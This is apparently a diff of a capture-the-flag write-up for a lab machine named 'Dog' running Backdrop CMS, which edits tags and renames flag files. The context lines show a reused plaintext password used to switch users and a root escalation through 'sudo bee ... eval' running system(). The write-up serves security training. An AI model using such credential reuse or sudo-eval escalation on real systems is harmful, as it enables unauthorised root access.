@@ -1,7 +1,7 @@
 ---
 title: Dog
 slug: Dog
-tags: [Linux, Backdrop, Githack, GitDump, Regex, Vulnerability Research]
+tags: [Backdrop, Regex, Vulnerability Research]
 ---
 ## Executive Summary
 
@@ -152,8 +152,8 @@ www-data@dog:/home$ su johncusack
 Password: BackDropJ2024DS2024
 johncusack@dog:/home$ cd johncusack/
 johncusack@dog:~$ ls
-user.txt
-johncusack@dog:~$ cat user.txt 
+local-proof.txt
+johncusack@dog:~$ cat local-proof.txt 
 # User.txt
 ```
 ## Privilege Escalation Path
@@ -173,7 +173,7 @@ johncusack@dog:/usr/local/bin$ ./bee
 🐝 Bee
 Usage: bee [global-options] <command> [options] [arguments]
 
-johncusack@dog:/usr/local/bin$ sudo bee --root=/var/www/html/ eval 'system("cat /root/root.txt");'
+johncusack@dog:/usr/local/bin$ sudo bee --root=/var/www/html/ eval 'system("cat /root/privileged-proof.txt");'
 # Root Flag
 ```
 
